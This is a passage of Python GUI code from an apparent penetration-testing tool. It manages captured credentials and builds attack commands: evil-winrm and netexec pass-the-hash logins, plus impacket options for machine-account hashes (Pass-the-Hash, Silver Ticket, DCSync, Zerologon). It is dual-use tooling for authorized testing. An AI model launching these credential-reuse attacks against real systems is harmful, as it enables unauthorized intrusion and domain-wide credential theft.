            command=lambda c=cred: self._edit_credential(c)
            ).pack(side="left", padx=2)

        # Delete button
        ctk.CTkButton(act, text="🗑 DELETE",
            width=70, height=18, font=_mono(10),
            fg_color=COLORS["bg_card"], hover_color="#2A0A0A",
            border_color=COLORS["text_red"], border_width=1,
            text_color=COLORS["text_red"], corner_radius=2,
            command=lambda c=cred: self._delete_credential(c)
            ).pack(side="left", padx=2)

        # SHOW RESULTS button — only for hash creds that have been cracked.
        if cred.cred_type == "hash" and getattr(cred, "cracked", False) \
                and cred.cracked_pass:
            ctk.CTkButton(act, text="👁 SHOW RESULT",
                width=110, height=18, font=_mono(10, True),
                fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_green"], border_width=1,
                text_color=COLORS["text_green"], corner_radius=2,
                command=lambda c=cred: self._show_cracked_result(c)
                ).pack(side="left", padx=2)

        # ▶ USE button — shown ONLY for machine-account hashes
        # (username ends with `$`, e.g. VAGRANT-2008R2$).  These hashes
        # are uncrackable by design (AD auto-generates 120-char UTF-16
        # random passwords that rotate every 30 days) but the hash
        # itself is still gold: use it directly for Pass-the-Hash,
        # Silver Ticket forging, DCSync if the target is a DC, or a
        # Zerologon check on un-patched 2008 R2 / 2012 DCs.  The USE
        # dialog launches each impacket command in its own xterm with
        # the right hash / user / target already substituted.
        _is_machine_acct = (cred.username or "").rstrip().endswith("$")
        if _is_machine_acct:
            ctk.CTkButton(act, text="▶ USE",
                width=55, height=18, font=_mono(10, True),
                fg_color=COLORS["bg_card"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["text_cyan"], border_width=1,
                text_color=COLORS["text_cyan"], corner_radius=2,
                command=lambda c=cred: self._use_credential(c)
                ).pack(side="left", padx=2)

        # COPY button — copy credential to clipboard
        ctk.CTkButton(act, text="📋 COPY",
            width=65, height=18, font=_mono(10),
            fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_dim"], border_width=1,
            text_color=COLORS["text_dim"], corner_radius=2,
            command=lambda c=cred: self._copy_credential(c)
            ).pack(side="left", padx=2)

        # → INTEL button — navigates to the Target Intel finding that
        # was produced by the same tool run.  Visible only when this
        # credential carries a linked_run_id (i.e. came from an AD
        # parser that also pushed an intel finding).  Manual creds,
        # hydra cracks, and clipboard imports don't have the field
        # populated so the button is hidden for them.
        if rid:
            ctk.CTkButton(
                act, text="→ INTEL",
                width=70, height=18, font=_mono(10, True),
                fg_color="transparent",
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["text_cyan"], border_width=1,
                text_color=COLORS["text_cyan"], corner_radius=2,
                command=lambda r=rid: self.app.navigate_to_run_id(
                    r, "intel"),
            ).pack(side="left", padx=2)

    def _build_cleartext_row(self, parent, cred, idx):
        # Special-case anonymous / null-auth entries: no password to show,
        # so render a human-readable "Anonymous login found on <host>" line
        # with the exact connect command underneath instead of the bare
        # "anonymous:" string which is meaningless at a glance.
        uname_low = (cred.username or "").lower()
        host      = getattr(cred, "host", "") or ""
        notes     = getattr(cred, "notes", "") or ""
        is_anon_like = (uname_low in ("anonymous", "guest", "null")
                        and not (cred.password or "").strip())

        if is_anon_like:
            svc_tag = "/".join(cred.services) if cred.services else "login"
            headline = (
                f"🔓 Anonymous {svc_tag} login"
                + (f" found on {host}" if host else " found")
            )
            ctk.CTkLabel(parent, text=headline,
                font=_mono(13, True), text_color=COLORS["text_green"],
                anchor="w").grid(row=0, column=0, columnspan=3,
                                 padx=(8, 4), pady=(4, 0), sticky="w")

            # Derive a connect command from notes (first "Connect: ..."
            # line) so the user can copy-paste directly. Fall back to a
            # generic smbclient hint if the notes field is missing.
            connect_cmd = ""
            for ln in notes.splitlines():
                ls = ln.strip()
                if ls.lower().startswith("connect:"):
                    connect_cmd = ls.split(":", 1)[1].strip()
                    break
            if not connect_cmd and host and "SMB" in (cred.services or []):
                connect_cmd = f"smbclient -L //{host} -N"

            if connect_cmd:
                ctk.CTkLabel(parent, text=f"$ {connect_cmd}",
                    font=_mono(12), text_color=COLORS["text_dim"],
                    anchor="w").grid(row=1, column=0, columnspan=3,
                                     padx=(14, 4), pady=(0, 4), sticky="w")
            return

        # SSH-key leads (e.g. linpeas "readable private key"): there is NO
        # password — the value is the key FILE to grab, not a secret.
        # Rendering "user:" with a blank secret looks like a broken empty-
        # password credential (this confused the operator on MS2), so show it
        # as a key lead with the path pulled from notes.
        if (getattr(cred, "cred_type", "") or "").lower() == "key":
            keypath = notes.split(":", 1)[-1].strip() if ":" in notes else ""
            headline = f"🔑 SSH key readable — {cred.username or '?'}"
            if host:
                headline += f" @ {host}"
            ctk.CTkLabel(parent, text=headline,
                font=_mono(13, True), text_color=COLORS["text_yellow"],
                anchor="w").grid(row=0, column=0, columnspan=3,
                                 padx=(8, 4), pady=(4, 0), sticky="w")
            if keypath:
                ctk.CTkLabel(parent, text=f"  grab: {keypath}",
                    font=_mono(12), text_color=COLORS["text_dim"],
                    anchor="w").grid(row=1, column=0, columnspan=3,
                                     padx=(14, 4), pady=(0, 4), sticky="w")
            return

        ctk.CTkLabel(parent, text=cred.username,
            font=_mono(13, True), text_color=COLORS["text_bright"],
            anchor="w").grid(row=0, column=0, padx=(8,2), pady=4)
        ctk.CTkLabel(parent, text=":",
            font=_mono(13), text_color=COLORS["text_muted"]
            ).grid(row=0, column=1, padx=1, pady=4)
        ctk.CTkLabel(parent, text=cred.password or "",
            font=_mono(13), text_color=COLORS["text_green"],
            anchor="w").grid(row=0, column=2, padx=2, pady=4, sticky="w")

    def _build_hash_row(self, parent, cred, idx):
        ht = cred.hash_type or detect_hash_type(cred.hash_val or "")
        hv = cred.hash_val or ""
        if len(hv) > 32 and ":" in hv:
            # LM:NTLM — show last part (NTLM hash is more useful)
            hs = "..." + hv[-20:]
        elif len(hv) > 28:
            hs = hv[:12] + "..." + hv[-12:]
        else:
            hs = hv

        ctk.CTkLabel(parent, text=cred.username,
            font=_mono(13, True), text_color=COLORS["text_bright"],
            anchor="w").grid(row=0, column=0, padx=(8,4), pady=4)
        # Hash-type badge: if detection failed, show a neutral "[hash]"
        # instead of the misleading yellow "[Unknown]".
        if ht and ht.lower() != "unknown":
            badge_text  = f"[{ht}]"
            badge_color = COLORS["text_yellow"]
        else:
            badge_text  = "[hash]"
            badge_color = COLORS["text_dim"]
        ctk.CTkLabel(parent, text=badge_text,
            font=_mono(11, True), text_color=badge_color,
            anchor="w").grid(row=0, column=1, padx=4, pady=4)
        ctk.CTkLabel(parent, text=hs,
            font=_mono(11), text_color=COLORS["text_dim"],
            anchor="w").grid(row=0, column=2, padx=2, pady=4, sticky="w")

        if getattr(cred, "cracked", False):
            # Show user:password when the username is known, password alone
            # otherwise. Having both on one line lets the user read usable
            # credentials at a glance without opening the detail popup.
            if (cred.username or "").strip():
                cracked_text = f"→ {cred.username}:{cred.cracked_pass}"
            else:
                cracked_text = f"→ {cred.cracked_pass}"
            ctk.CTkLabel(parent, text=cracked_text,
                font=_mono(13, True), text_color=COLORS["text_green"]
                ).grid(row=0, column=3, padx=4, pady=4)
        else:
            # Row-level crack control.  When a crack is running on
            # THIS credential's idx, swap the yellow 🔓 CRACK button
            # for a red ⏹ STOP button (1a in the agreed UX) and add a
            # small `[cracking · STRATEGY]` badge so the user sees at
            # a glance what's going on — useful when the progress
            # dialog has been closed and the crack is still chewing in
            # the background.
            active = self._active_cracks.get(getattr(cred, "id", None))
            if active:
                # Badge column (uses an existing empty cell to the left
                # of the button — grid column 2.5 effectively).  Packed
                # inline with the button via its own mini-frame so the
                # column widths don't reflow.
                stop_box = ctk.CTkFrame(parent, fg_color="transparent")
                stop_box.grid(row=0, column=3, padx=(2, 8), pady=4,
                               sticky="e")
                ctk.CTkLabel(
                    stop_box,
                    text=f"[cracking · {active.get('strategy', '?')}]",
                    font=_mono(10, True),
                    text_color=COLORS["text_yellow"],
                    anchor="e",
                ).pack(side="left", padx=(0, 6))
                ctk.CTkButton(
                    stop_box, text="⏹ STOP",
                    width=80, height=22, font=_mono(11, True),
                    fg_color=COLORS["bg_card"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["text_red"], border_width=1,
                    text_color=COLORS["text_red"], corner_radius=2,
                    command=lambda cid=cred.id: self._stop_crack_on_row(cid),
                ).pack(side="left")
            else:
                ctk.CTkButton(parent, text="🔓 CRACK",
                    width=80, height=22, font=_mono(11, True),
                    fg_color=COLORS["bg_card"], hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["text_yellow"], border_width=1,
                    text_color=COLORS["text_yellow"], corner_radius=2,
                    command=lambda c=cred: self._show_crack_dialog(c)
                    ).grid(row=0, column=3, padx=(4,8), pady=4)

    # ─── Edit / Delete ────────────────────────────────────────────────────────

    def _edit_credential(self, cred):
        """Edit an existing credential — username, password/hash, services."""
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn
        is_hash = (cred.cred_type == "hash")
        win = _make_win(self, "Edit Credential", 520, 380 if not is_hash else 420)
        ctk.CTkLabel(win, text="Edit Credential",
            font=_mono(15, True), text_color=COLORS["text_bright"]
            ).pack(pady=(14,8))

        fields = {}
        for label, key, initial, color in [
            ("Username:", "user", cred.username or "", COLORS["text_bright"]),
            ("Services:", "svc",  ",".join(cred.services or []), COLORS["text_bright"]),
        ]:
            rf = ctk.CTkFrame(win, fg_color="transparent")
            rf.pack(fill="x", padx=24, pady=3)
            ctk.CTkLabel(rf, text=label, font=_mono(13),
                text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
            e = ctk.CTkEntry(rf, height=28, font=_mono(13),
                fg_color=COLORS["bg_card"], text_color=color,
                border_color=COLORS["border_green"], border_width=1, corner_radius=3)
            e.insert(0, initial)
            e.pack(side="left", fill="x", expand=True)
            fields[key] = e

        if is_hash:
            # Hash field
            hf = ctk.CTkFrame(win, fg_color="transparent")
            hf.pack(fill="x", padx=24, pady=3)
            ctk.CTkLabel(hf, text="Hash:", font=_mono(13),
                text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
            hash_e = ctk.CTkEntry(hf, height=28, font=_mono(11),
                fg_color=COLORS["bg_card"], text_color=COLORS["text_yellow"],
                border_color=COLORS["border_amber"], border_width=1, corner_radius=3)
            hash_e.insert(0, cred.hash_val or "")
            hash_e.pack(side="left", fill="x", expand=True)
            fields["hash"] = hash_e

            # Hash type
            htf = ctk.CTkFrame(win, fg_color="transparent")
            htf.pack(fill="x", padx=24, pady=3)
            ctk.CTkLabel(htf, text="Hash type:", font=_mono(13),
                text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
            ht_var = ctk.StringVar(value=cred.hash_type or "NTLM")
            ctk.CTkOptionMenu(htf,
                values=["NTLM","LM","MD5","SHA1","SHA256","SHA512","NTLMv2","bcrypt"],
                variable=ht_var, width=180, height=28, font=_mono(12),
                fg_color=COLORS["bg_card"], button_color=COLORS["border_dim"],
                dropdown_fg_color=COLORS["bg_secondary"],
                dropdown_text_color=COLORS["text_bright"],
                text_color=COLORS["text_dim"], corner_radius=3
                ).pack(side="left", padx=8)
        else:
            # Password field
            pf = ctk.CTkFrame(win, fg_color="transparent")
            pf.pack(fill="x", padx=24, pady=3)
            ctk.CTkLabel(pf, text="Password:", font=_mono(13),
                text_color=COLORS["text_dim"], width=110, anchor="w").pack(side="left")
            pass_e = ctk.CTkEntry(pf, height=28, font=_mono(13),
                fg_color=COLORS["bg_card"], text_color=COLORS["text_green"],
                border_color=COLORS["border_green"], border_width=1, corner_radius=3)
            pass_e.insert(0, cred.password or "")
            pass_e.pack(side="left", fill="x", expand=True)
            fields["pass"] = pass_e

        def _save():
            sess = self.app.session_manager.current
            if not sess:
                return
            # Must mutate sess.credentials directly — get_credentials()
            # rebuilds a fresh list of Credential objects on every call,
            # so assigning on those objects never reached the session
            # and save() re-serialised the untouched dicts: the dialog
            # said "Credential updated" and nothing changed.  Same class
            # as the DELETE bug documented in Session.delete_credential.
            # Address by stable id, not index: another row could have been
            # deleted while this edit dialog sat open, sliding every
            # position — an index would then rewrite the wrong credential.
            entry = sess.get_credential_by_id(cred.id)
            ok = entry is not None
            if ok:
                entry["username"] = fields["user"].get().strip()
                entry["services"] = [
                    s.strip() for s in fields["svc"].get().split(",")
                    if s.strip()]
                if is_hash:
                    entry["hash_val"]  = fields["hash"].get().strip()
                    entry["hash_type"] = ht_var.get()
                else:
                    entry["password"] = fields["pass"].get().strip()
                sess._touch()
                sess.save()
            _safe_destroy(win)
            self.refresh()
            if ok:
                self.app.terminal.write("  [+] Credential updated.",
                                        "success")
            else:
                self.app.terminal.write(
                    "  [!] Edit failed: credential no longer exists.",
                    "warn")

        r = _btn_row(win)
        _btn(r, "SAVE", _save, primary=True)
        _btn(r, "CANCEL", lambda: _safe_destroy(win))

    def _delete_credential(self, cred):
        """Delete a credential after confirmation."""
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn
        win = _make_win(self, "Delete Credential", 420, 200)
        ctk.CTkLabel(win, text="Delete this credential?",
            font=_mono(14, True), text_color=COLORS["text_red"]
            ).pack(pady=(20,8))
        ctk.CTkLabel(win, text="This action cannot be undone.",
            font=_mono(12), text_color=COLORS["text_muted"]).pack()

        def _confirm():
            sess = self.app.session_manager.current
            if not sess:
                _safe_destroy(win)
                return
            # Must mutate sess.credentials directly — get_credentials()
            # returns a fresh list of reconstructed Credential objects,
            # so deleting from that list never reaches the session.
            # Address by stable id: if a background crack just finished
            # and repainted the list, the row's old index could now point
            # at a different credential.
            ok = sess.delete_credential_by_id(cred.id)
            if ok:
                sess.save()
            _safe_destroy(win)
            self.refresh()
            if ok:
                self.app.terminal.write(
                    "  [*] Credential deleted.", "dim")
            else:
                self.app.terminal.write(
                    "  [!] Delete failed: credential no longer exists.",
                    "warn")

        r = _btn_row(win)
        _btn(r, "DELETE", _confirm, danger=True, w=100)
        _btn(r, "CANCEL", lambda: _safe_destroy(win))

    # ─── Copy credential ─────────────────────────────────────────────────────

    def _copy_credential(self, cred):
        """Copy credential info to clipboard."""
        # Anonymous / null-auth entries: copy the ready-to-run connect
        # command instead of the useless "anonymous:" string.
        uname_low = (cred.username or "").lower()
        if (cred.cred_type == "cleartext"
                and uname_low in ("anonymous", "guest", "null")
                and not (cred.password or "").strip()):
            connect_cmd = ""
            for ln in (getattr(cred, "notes", "") or "").splitlines():
                if ln.strip().lower().startswith("connect:"):
                    connect_cmd = ln.split(":", 1)[1].strip()
                    break
            if not connect_cmd:
                host = getattr(cred, "host", "") or "TARGET"
                connect_cmd = f"smbclient -L //{host} -N"
            try:
                self.clipboard_clear()
                self.clipboard_append(connect_cmd)
                self.app.terminal.write(
                    f"  [+] Copied connect command: {connect_cmd}",
                    "success")
            except Exception:
                try:
                    import subprocess
                    subprocess.Popen(["xclip", "-selection", "clipboard"],
                                     stdin=subprocess.PIPE
                                     ).communicate(connect_cmd.encode())
                    self.app.terminal.write(
                        f"  [+] Copied connect command: {connect_cmd}",
                        "success")
                except Exception:
                    self.app.terminal.write(
                        "[!] Copy failed — install xclip: "
                        "sudo apt install xclip", "error")
            return

        if cred.cred_type == "hash":
            text = cred.hash_val or ""
            if cred.cracked_pass:
                text = cred.cracked_pass
        else:
            text = cred.password or ""
        # Build full string: user:pass or user:hash
        full = f"{cred.username}:{text}" if cred.username else text
        try:
            self.clipboard_clear()
            self.clipboard_append(full)
            self.app.terminal.write(f"  [+] Copied to clipboard: {cred.username}:***", "success")
        except Exception:
            # Fallback: xclip
            try:
                import subprocess
                subprocess.Popen(["xclip", "-selection", "clipboard"],
                                 stdin=subprocess.PIPE).communicate(full.encode())
                self.app.terminal.write(f"  [+] Copied to clipboard: {cred.username}:***", "success")
            except Exception:
                self.app.terminal.write("[!] Copy failed — install xclip: sudo apt install xclip", "error")

    # ─── Show cracked result ─────────────────────────────────────────────────

    def _show_cracked_result(self, cred):
        """Popup that shows the cracked plaintext for a hash credential.
        The user can then copy username and/or password to use however
        they want (ssh, evil-winrm, netexec...)."""
        try:
            from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn
        except Exception as e:
            self.app.terminal.write(
                f"  [!] SHOW RESULT failed to import dialogs: {e}", "error")
            return

        # Heal legacy/orphan credentials whose hash_val still carries a
        # pwdump-style "user:RID:LM:NT:::" prefix with no username field set.
        # Happens for creds cracked before split_username_hash() existed or
        # imported via an older code path. We do it here (and not only in
        # _show_crack_dialog) so SHOW RESULT also shows "Administrator" and
        # not "(unknown)".
        raw_hv = cred.hash_val or ""
        if not (cred.username or "").strip() and raw_hv:
            parsed_u, parsed_h, parsed_ht = split_username_hash(raw_hv)
            if parsed_u and parsed_h:
                sess = self.app.session_manager.current
                try:
                    if sess:
                        # Address THIS credential by its stable id instead
                        # of scanning by hash_val — two orphan creds could
                        # share the same hash_val and the scan would heal
                        # whichever came first, not the one clicked.
                        cd = sess.get_credential_by_id(cred.id)
                        if (cd is not None
                                and not (cd.get("username") or "").strip()):
                            cd["username"]  = parsed_u
                            cd["hash_val"]  = parsed_h
                            if parsed_ht and parsed_ht != "Unknown":
                                cd["hash_type"] = parsed_ht
                            sess._touch()
                            sess.save()
                except Exception as e:
                    print(f"[hawk] heal in _show_cracked_result failed: {e}")
                cred.username  = parsed_u
                cred.hash_val  = parsed_h
                if parsed_ht and parsed_ht != "Unknown":
                    cred.hash_type = parsed_ht
                self.refresh()

        user = cred.username or "(unknown)"
        pw   = cred.cracked_pass or "(empty)"
        hv   = cred.hash_val or ""
        ht   = cred.hash_type or "?"

        win = _make_win(self, "Cracked Credential", 560, 340)
        # Force the popup to the front — CTkToplevel can end up behind the
        # main window on some WMs (Kali/X11 in particular), which makes the
        # click feel like it did nothing.
        try:
            win.transient(self.app)
            win.lift()
            win.focus_force()
            win.attributes("-topmost", True)
            win.after(150, lambda: win.attributes("-topmost", False))
        except Exception as e:
            print(f"[hawk] cracked-result raise failed: {e}")
        ctk.CTkLabel(win, text="🔓  Cracked Credential",
            font=_mono(15, True), text_color=COLORS["text_green"]
            ).pack(pady=(14, 8))

        # Field rows — label + value + copy button
        for label, value, color in [
            ("Username:", user, COLORS["text_bright"]),
            ("Password:", pw,   COLORS["text_green"]),
            ("Hash type:", ht,  COLORS["text_yellow"]),
            ("Hash:",     hv[:56] + ("..." if len(hv) > 56 else ""),
                              COLORS["text_dim"]),
        ]:
            rf = ctk.CTkFrame(win, fg_color=COLORS["bg_card"], corner_radius=3)
            rf.pack(fill="x", padx=24, pady=3)
            ctk.CTkLabel(rf, text=f"  {label}", font=_mono(12),
                text_color=COLORS["text_muted"], width=100, anchor="w"
                ).pack(side="left", padx=(4, 2), pady=6)
            ctk.CTkLabel(rf, text=value, font=_mono(12, True),
                text_color=color, anchor="w"
                ).pack(side="left", padx=4, pady=6, fill="x", expand=True)

            if value and value != "(unknown)":
                ctk.CTkButton(rf, text="📋 COPY",
                    width=70, height=22, font=_mono(10),
                    fg_color=COLORS["bg_secondary"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_dim"], border_width=1,
                    text_color=COLORS["text_dim"], corner_radius=2,
                    command=lambda v=value: self._copy_value(v)
                    ).pack(side="right", padx=6, pady=4)

        # user:password combo line
        combo = f"{user}:{pw}"
        rf = ctk.CTkFrame(win, fg_color=COLORS["bg_card"], corner_radius=3)
        rf.pack(fill="x", padx=24, pady=(8, 3))
        ctk.CTkLabel(rf, text="  user:pass:", font=_mono(12),
            text_color=COLORS["text_muted"], width=100, anchor="w"
            ).pack(side="left", padx=(4, 2), pady=6)
        ctk.CTkLabel(rf, text=combo, font=_mono(12, True),
            text_color=COLORS["text_cyan"], anchor="w"
            ).pack(side="left", padx=4, pady=6, fill="x", expand=True)
        ctk.CTkButton(rf, text="📋 COPY",
            width=70, height=22, font=_mono(10),
            fg_color=COLORS["bg_secondary"],
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["border_green"], border_width=1,
            text_color=COLORS["text_green"], corner_radius=2,
            command=lambda v=combo: self._copy_value(v)
            ).pack(side="right", padx=6, pady=4)

        r = _btn_row(win)
        _btn(r, "CLOSE", lambda: _safe_destroy(win), primary=True)

    def _copy_value(self, value: str):
        """Shared clipboard helper used by the cracked-result popup."""
        try:
            self.clipboard_clear()
            self.clipboard_append(value)
            self.app.terminal.write(f"  [*] Copied: {value}", "dim")
        except Exception as e:
            self.app.terminal.write(
                f"  [!] Copy failed: {e}. Try: sudo apt install xclip", "error")

    # ─── Use credential (legacy, no longer bound to a button) ────────────────

    def _use_credential(self, cred):
        """Router: machine accounts → impacket dialog (PtH / DCSync /
        Silver ticket / Zerologon check).  Regular user accounts →
        service-picker dialog (SSH / WinRM / SMB / RDP / FTP / HTTP).

        The USE button only renders for machine accounts currently
        (see _build_hash_row), but the router is kept general so the
        same entry point can serve both flows if we ever re-enable
        USE for user accounts."""
        from gui.dialogs import _make_win, _safe_destroy, _btn_row, _btn
        from utils.runner import _open_terminal

        target = self.app.target_bar.get_target()
        if not target:
            self.app.terminal.write("  [!] No target IP set.", "error")
            return

        # Machine-account detection: AD computer accounts always have a
        # trailing `$` in their sAMAccountName (e.g. DC01$, VAGRANT-2008R2$).
        # The hash you get from SAM / secretsdump / LSASS uses exactly
        # that name, so a simple .endswith('$') is the canonical check.
        if (cred.username or "").rstrip().endswith("$"):
            self._use_machine_account_credential(cred, target)
            return

        # Get open ports from Target Intel
        fp = getattr(self.app.target_intel, "_fp", None)
        ports = []
        if fp and hasattr(fp, "open_ports"):
            ports = fp.open_ports  # list of (port, proto, service, banner)

        if not ports:
            self.app.terminal.write("  [!] No ports detected — run a scan first.", "warn")
            return

        # Determine password or hash
        password = cred.password if cred.cred_type == "cleartext" else cred.cracked_pass
        username = cred.username
        q_target = shlex.quote(target)
        q_user = shlex.quote(username or "")
        q_pass = shlex.quote(password or "")
        q_hash = shlex.quote(cred.hash_val or "")
        q_ssh_dest = shlex.quote(f"{username}@{target}")

        # Service-to-command mapping
        def _build_cmd(port, service):
            p = str(port)
            svc = service.lower()
            if "ssh" in svc:
                if password:
                    return f"sshpass -p {q_pass} ssh -o StrictHostKeyChecking=no {q_ssh_dest} -p {p}; read -p 'Press ENTER to close...'"
                return f"ssh -o StrictHostKeyChecking=no {q_ssh_dest} -p {p}; read -p 'Press ENTER to close...'"
            if "winrm" in svc or "wsman" in svc or port == 5985:
                if password:
                    return f"evil-winrm -i {q_target} -u {q_user} -p {q_pass}; read -p 'Press ENTER to close...'"
                if cred.cred_type == "hash" and cred.hash_val:
                    return f"evil-winrm -i {q_target} -u {q_user} -H {q_hash}; read -p 'Press ENTER to close...'"
                return f"evil-winrm -i {q_target} -u {q_user}; read -p 'Press ENTER to close...'"
            if "smb" in svc or "microsoft-ds" in svc or "netbios" in svc or port in (445, 139):
                if password:
                    q_unc = shlex.quote(f"//{target}")
                    q_auth = shlex.quote(f"{username}%{password}")
                    return f"smbclient -L {q_unc} -p {p} -U {q_auth}; read -p 'Press ENTER to close...'"
                if cred.cred_type == "hash" and cred.hash_val:
                    return f"netexec smb {q_target} -u {q_user} -H {q_hash}; read -p 'Press ENTER to close...'"
                q_unc = shlex.quote(f"//{target}")
                return f"smbclient -L {q_unc} -p {p} -U {q_user}; read -p 'Press ENTER to close...'"
            if "rdp" in svc or port == 3389:
                from modules.base import _resolve_freerdp, _rdp_compat_flags
                _rdp = _resolve_freerdp()
                _fl  = _rdp_compat_flags()
                if password:
                    return f"{shlex.quote(_rdp)} /v:{q_target}:{p} /u:{q_user} /p:{q_pass} {_fl}; read -p 'Press ENTER to close...'"
                return f"{shlex.quote(_rdp)} /v:{q_target}:{p} /u:{q_user} {_fl}; read -p 'Press ENTER to close...'"
            if "ftp" in svc or port == 21:
                if password:
                    ftp_user = (username or "").replace("\r", " ").replace("\n", " ")
                    ftp_pass = (password or "").replace("\r", " ").replace("\n", " ")
                    return f"ftp -n {q_target} {p} <<'EOF'\nuser {ftp_user} {ftp_pass}\nls\nEOF\nread -p 'Press ENTER to close...'"
                return f"ftp {q_target} {p}; read -p 'Press ENTER to close...'"
            if "http" in svc or "https" in svc or port in (80, 443, 8080, 8443):
                scheme = "https" if ("https" in svc or port in (443, 8443)) else "http"
                q_auth = shlex.quote(f"{username}:{password or ''}")
                q_url = shlex.quote(f"{scheme}://{target}:{p}/")
                return f"curl -u {q_auth} {q_url}; read -p 'Press ENTER to close...'"
            return None

        # Build dialog with service buttons
        win = _make_win(self, "Use Credential", 520, 380)
        ctk.CTkLabel(win, text="Use Credential",
            font=_mono(16, True), text_color=COLORS["text_bright"]
            ).pack(pady=(14, 4))
        ctk.CTkLabel(win,
            text=f"  {username}  {'→ ' + password if password else '(hash)'}",
            font=_mono(13), text_color=COLORS["text_green"]
            ).pack(pady=(0, 8))
        ctk.CTkLabel(win, text="Select target service:",
            font=_mono(12), text_color=COLORS["text_muted"]
            ).pack(anchor="w", padx=24)

        scroll = ctk.CTkScrollableFrame(win, fg_color=COLORS["bg_card"],
            corner_radius=3, height=200)
        scroll.pack(fill="both", expand=True, padx=20, pady=8)

        found_any = False
        for port, proto, service, banner in ports:
            cmd = _build_cmd(port, service)
            if cmd is None:
                continue
            found_any = True
            svc_label = f"  {port}/{proto}  —  {service}"
            if banner:
                svc_label += f"  ({banner[:40]})"

            def _launch(c=cmd, w=win, p=port, s=service):
                _safe_destroy(w)
                _open_terminal(f"HAWK — {s} @ {target}:{p}", c)
                self.app.terminal.write(
                    f"  [+] Connecting to {target}:{p} ({s}) as {username}",
                    "success")

            ctk.CTkButton(scroll, text=svc_label,
                width=440, height=28, font=_mono(12),
                fg_color=COLORS["bg_secondary"],
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["border_dim"], border_width=1,
                text_color=COLORS["text_bright"], corner_radius=3,
                anchor="w", command=_launch
                ).pack(fill="x", pady=2)

        if not found_any:
            ctk.CTkLabel(scroll,
                text="No matching services for this credential type.",
                font=_mono(12), text_color=COLORS["text_muted"]
                ).pack(pady=20)

        r = _btn_row(win)
        _btn(r, "CANCEL", lambda: _safe_destroy(win))

    # ─── USE for machine accounts (Pass-the-Hash / DCSync / Silver) ───────
    def _use_machine_account_credential(self, cred, target):
        """Show a dialog with impacket-oriented options for a machine
        account hash.

        Machine account passwords in Active Directory are 120-character
        UTF-16 random blobs rotated every 30 days — so the hash is
        effectively uncrackable by any wordlist or bruteforce.  That's
        NOT a bug, it's by design.  But the hash itself is
        cryptographically equivalent to the password: you can use it
        directly with NTLM authentication (Pass-the-Hash), forge
        Kerberos tickets (Silver Ticket), dump the whole domain if
        the target is a DC (DCSync via secretsdump), or test for
        Zerologon (CVE-2020-1472) on un-patched pre-2020 DCs.

        Each action launches its own xterm with the command already
        pre-filled with hash / username / target.  The user can edit
        before running.  Nothing fires automatically."""
        from gui.dialogs import (_make_win, _safe_destroy, _btn_row,
                                   _btn, _title, _sub, _note_box)
        from utils.runner import _open_terminal

        # Every value below (hash, sAMAccountName, domain) comes from
        # the target's own output and lands in a `bash -c` line, so
        # each one goes through shlex.quote.  A machine account named
        # `WS01$;id;$` would otherwise run whatever it wants.
        _q = shlex.quote

        # Extract the NTLM half from a potential "LM:NTLM" string —
        # impacket's `-hashes` flag wants the full `LMHASH:NTLMHASH`
        # form, so we pass hash_val verbatim when it's already in
        # that form, and synthesise the empty-LM prefix otherwise.
        raw_hash = (cred.hash_val or "").strip()
        if ":" in raw_hash and len(raw_hash.split(":")[-1]) == 32:
            hashes_arg = raw_hash          # already LM:NTLM
        elif len(raw_hash) == 32:
            hashes_arg = f"aad3b435b51404eeaad3b435b51404ee:{raw_hash}"
        else:
            hashes_arg = raw_hash  # non-standard — let impacket complain

        username = (cred.username or "").rstrip()
        # Machine name without the trailing $ — used in FQDN / SPN
        # contexts (Silver ticket target SPN = CIFS/<machine>.<domain>).
        machine_name = username.rstrip("$")

        # Pull target domain from the session target bar / manager so
        # the user doesn't have to retype it.  Fall back to a
        # placeholder the user can edit in the xterm.
        target_domain = ""
        try:
            tb = getattr(self.app, "target_bar", None)
            if tb:
                target_domain = (tb.get_target_domain() or "").strip()
        except Exception:
            pass
        if not target_domain:
            try:
                sess = self.app.session_manager.current
                if sess:
                    target_domain = (getattr(sess, "target_domain", "")
                                       or "").strip()
            except Exception:
                pass
        if not target_domain:
            target_domain = "<DOMAIN>"

        # ── Window ───────────────────────────────────────────────
        win = _make_win(
            self, f"USE — machine account {username}", 820, 680)
        _title(win, f"🔑  USE machine-account hash — {username}")
        _sub(win,
              "Machine-account NTLM hashes are uncrackable by design "
              "(120-char UTF-16 random, rotates every 30 days).  "
              "Use them as KEYS — Pass-the-Hash, ticket forgery, "
              "DCSync — not as puzzles.",
              COLORS["text_dim"])

        _note_box(
            win,
            f"Target     : {target}\n"
            f"Domain     : {target_domain}\n"
            f"Machine    : {machine_name}  (sAMAccountName: {username})\n"
            f"Hash       : {raw_hash[:28]}{'…' if len(raw_hash) > 28 else ''}\n"
            f"Auth arg   : -hashes {hashes_arg}",
            COLORS["text_yellow"])

        # ── Scrollable container with grouped actions ──────────
        scroll = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_dim"], border_width=1,
            corner_radius=4)
        scroll.pack(fill="both", expand=True, padx=16, pady=6)

        def _section(title, color):
            """Section header inside the scrollable container."""
            fr = ctk.CTkFrame(scroll, fg_color="transparent")
            fr.pack(fill="x", padx=4, pady=(10, 2))
            ctk.CTkLabel(
                fr, text=f"  {title}",
                font=_mono(12, True), text_color=color,
                anchor="w").pack(fill="x")
            ctk.CTkFrame(
                scroll, fg_color=color, height=1, corner_radius=0
            ).pack(fill="x", padx=6)

        def _action_row(label, xterm_title, cmd, hint):
            """One actionable row: big green button + hint below."""
            rf = ctk.CTkFrame(
